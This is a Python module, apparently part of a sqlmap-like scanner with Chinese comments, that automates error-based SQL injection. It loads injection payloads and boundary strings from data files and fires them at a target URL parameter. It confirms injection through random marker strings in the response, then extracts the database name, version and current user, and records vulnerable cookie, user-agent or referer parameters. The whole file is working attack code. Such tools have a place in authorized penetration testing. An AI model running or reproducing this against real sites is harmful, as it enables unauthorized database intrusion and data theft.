from lib.core.settings import BOUNDARIES_FILE_NAME
from lib.core.settings import DATA_FILE_NAME
from lib.core.settings import ERROR_FILE_NAME
from data.json_file import get_json
import random
import string
from lib.utils.cache import Cache
from lib.core.settings import SQLITE_FILE_NAME

class CheckError():
    def __init__(self, urls, id, db, top_boundaries, log):
        self.urls = urls
        self.db = db
        self.id = id
        self.log = log
        self.param = self.urls.params[id]
        self.top_boundaries = top_boundaries
        self.boundaries = get_json(BOUNDARIES_FILE_NAME, "low")   
        self.error_payloads = get_json(ERROR_FILE_NAME, self.db)
        self.data_payloads = get_json(DATA_FILE_NAME, self.db)

    def start_top_add(self, payload, data):
        '''
            替换payload的start,stop和data
            returns: 替换后的payload
        '''
        start = ''.join(random.sample(string.ascii_letters + string.digits, 3))
        stop = ''.join(random.sample(string.ascii_letters + string.digits, 3))
        new_payload = payload.replace("[START]", start).replace("[STOP]", stop).replace("[DATA]", data)
        return new_payload, start, stop

    def check_error_payload(self):
        '''
            检测报错注入函数,检测所有payload,返回可注入的payload
            returns: False 
        '''
        for payload_dict in self.error_payloads:
            payload = payload_dict["payload"]
            payload,start,stop = self.start_top_add(payload, "'test'")
            url = self.urls.http_payload(self.param, payload, self.top_boundaries)
            if self.urls.check_keyword(url,start + "test" + stop, False):
                return payload, start, stop
        return False, start, stop
        # # 对每一个报错payload进行测试
        # for payload_dict in self.error_payloads:
        #     payload = payload_dict["payload"]
        #     start_top_add(self, payload, data)
        # urls_list = self.urls.http_request_payloads(self.param, self.top_boundaries, )
        # for url in urls_list:

    def show_basic_data(self, payload, start, stop, data_type):
        '''
            返回数据库版本号,用户,数据库名
            returns: []
        '''        
        data_payload = self.data_payloads[data_type]
        payload = payload.replace("'test'",data_payload)
        url = self.urls.http_payload(self.param, payload, self.top_boundaries)
        return self.urls.check_keyword(url,start + "(.*?)" + stop, False)

    def detected(self):
        '''
            主函数
        '''
        # 确认注入点
        payload, start, stop= self.check_error_payload()
        if payload:
            self.log.debug("检测出注入类型为联合注入,检测结果如下:")
            self.log.debug("爆出的数据库名为:%s" %(self.show_basic_data(payload, start, stop, "db_name")[0]))
            self.log.debug("爆出的数据库版本号为:%s" %self.show_basic_data(payload, start, stop, "db_version")[0])
            self.log.debug("爆出的数据库用户名为:%s" %self.show_basic_data(payload, start, stop, "user_name")[0])
            self.log.warning("检测完毕")
            if self.urls.method in ["cookie","ua","referer"]:
                cache = Cache(SQLITE_FILE_NAME)
                cache.insert(self.urls.url, self.db, self.top_boundaries, "error_query",self.urls.method)
            # self.log.info((self.urls.url, self.db, self.top_boundaries, "error_query",self.urls.method))
            return True
        # 检测所有boundaries
        for boundaries in self.boundaries:
            self.top_boundaries.clear()
            self.top_boundaries.append(boundaries)
            payload, start, stop= self.check_error_payload()
            if payload:
                self.log.debug("检测出注入类型为,检测结果如下:")
                self.log.debug("爆出的数据库名为:%s" %(self.show_basic_data(payload, start, stop, "db_name")[0]))
                self.log.debug("爆出的数据库版本号为:%s" %self.show_basic_data(payload, start, stop, "db_version")[0])
                self.log.debug("爆出的数据库用户名为:%s" %self.show_basic_data(payload, start, stop, "user_name")[0])
                self.log.warning("检测完毕")
                if self.urls.method in ["cookie","ua","referer"]:
                    cache = Cache(SQLITE_FILE_NAME)
                    cache.insert(self.urls.url, self.db, self.top_boundaries, "error_query",self.urls.method)
                return True
        return False  